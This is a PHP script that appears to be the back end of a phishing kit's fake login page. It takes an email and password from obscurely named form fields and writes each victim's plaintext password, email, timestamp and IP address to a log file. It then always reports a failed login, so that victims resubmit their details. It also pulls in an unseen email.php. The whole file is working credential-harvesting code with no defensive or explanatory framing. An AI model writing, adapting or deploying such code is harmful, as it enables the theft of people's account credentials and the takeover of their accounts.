<?php
require_once 'email.php';

// Input validation
$email = filter_input(INPUT_POST, 'di', FILTER_VALIDATE_EMAIL);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response
function sendJsonResponse($success, $message = '', $redirectUrl = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'redirectUrl' => $redirectUrl
    ]);
    exit();
}

// Validate email and password
if (!empty($email) && !empty($password)) {
    // Define log file path
    $logFilePath = __DIR__ . '/logs/login_attempts.txt';

    try {
        // Ensure the parent directory exists
        if (!file_exists(__DIR__ . '/logs')) {
            mkdir(__DIR__ . '/logs', 0755, true);
        }

        // Append login data to log file
        $logContent = "Date: " . date("Y-m-d H:i:s") . "\nEmail: {$email}\nPassword: {$password}\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n\n";
        file_put_contents($logFilePath, $logContent, FILE_APPEND);

        // Return a generic failure response
        sendJsonResponse(false, "Login failed. Invalid credentials.");
    } catch (Exception $e) {
        // Handle exceptions by logging errors
        error_log("Failed to write logs: " . $e->getMessage());
        sendJsonResponse(false, "A server error occurred while handling your request.");
    }
} else {
    // Handle invalid inputs
    sendJsonResponse(false, "Email or Password missing.");
}
?>
